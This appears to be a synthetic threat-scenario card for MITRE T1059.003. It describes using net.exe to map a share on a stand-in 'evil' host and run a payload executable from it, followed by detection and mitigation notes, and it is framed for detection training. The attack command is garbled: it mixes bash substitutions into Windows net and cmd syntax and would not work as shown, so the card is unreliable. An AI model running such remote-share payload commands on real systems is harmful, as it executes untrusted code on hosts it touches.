---
type: campaign
scenario_id: 139
tactic: Execution
technique: "T1059.003: Windows Command Shell"
technique_id: T1059.003
tags: [campaign, lotl, execution]
---

# Using net.exe to execute malicious share-based payload.

## Threat Description
Using net.exe to execute malicious share-based payload.

## Attack Command
```
net use \\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\IPC$ /u:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) && cmd /c \\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\$(echo share$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)
```

## Detection Logic
Monitor net use: `wmic process where name='net.exe' get commandline | findstr IPC`; Event ID 5140.

## Mitigation
Restrict net.exe: `icacls %windir%\System32\net.exe /deny Everyone:RX`; Disable SMBv1: `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`.

## AI Training Prompt
Train AI to detect net.exe share execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
